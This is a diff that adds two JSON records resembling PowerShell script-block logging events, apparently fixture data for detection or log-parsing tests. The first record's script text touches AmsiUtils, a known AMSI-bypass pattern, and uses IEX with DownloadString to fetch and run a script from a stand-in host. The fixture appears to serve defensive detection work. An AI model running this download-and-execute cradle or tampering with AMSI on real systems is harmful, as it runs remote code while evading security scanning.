@@ -1,0 +1,2 @@
+{"event":{"code":4104,"id":"e1"},"host":{"name":"WS-0231"},"user":{"name":"jdoe"},"winlog":{"event_data":{"ScriptBlockText":"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | Out-Null; IEX (New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')"}}}
+{"event":{"code":4104,"id":"e2"},"host":{"name":"WS-0231"},"user":{"name":"jdoe"},"winlog":{"event_data":{"ScriptBlockText":"[REDACTED_OR_MISSING]"}}}
